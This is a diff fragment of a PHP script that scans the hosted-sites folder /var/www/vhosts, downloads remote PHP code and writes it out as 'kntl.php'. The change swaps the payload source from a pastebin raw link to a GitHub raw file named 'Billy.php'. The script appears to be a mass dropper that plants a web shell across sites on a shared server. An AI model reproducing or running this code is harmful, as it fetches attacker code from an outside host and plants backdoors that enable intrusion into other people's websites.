@@ -5,7 +5,7 @@ $root = '/var/www/vhosts';
 $scan = scandir($root);
 
 $nama = 'kntl.php'; 
-$isi = file_get_contents('https://pastebin.com/raw/aBF9D9Jg'); 
+$isi = file_get_contents('https://raw.githubusercontent.com/Sniperxxx/sniper404/main/Billy.php'); 
 
 $bikin = fopen($nama, "w");
 		 fwrite($bikin, $isi);
